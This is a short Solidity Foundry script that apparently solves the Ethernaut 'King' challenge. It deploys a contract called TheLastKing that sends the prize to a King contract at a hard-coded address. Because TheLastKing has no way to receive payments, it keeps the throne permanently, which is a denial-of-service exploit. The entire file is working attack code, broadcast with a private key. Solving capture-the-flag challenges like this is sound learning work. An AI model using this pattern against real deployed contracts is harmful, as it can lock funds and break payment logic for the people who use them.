//SPDX: License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/King.sol";
import "../lib/forge-std/src/Test.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract TheLastKing {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}

contract KingSolution is Script {
   
   King public kingInstance = King(payable(0x4aa794C5eB5C2f1186d400E550Ac2fe9387e68cA));

   function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    new TheLastKing{value: kingInstance.prize()}(kingInstance);
    console.log("THE LAST KING :P:", kingInstance.owner());
    vm.stopBroadcast();
   }
}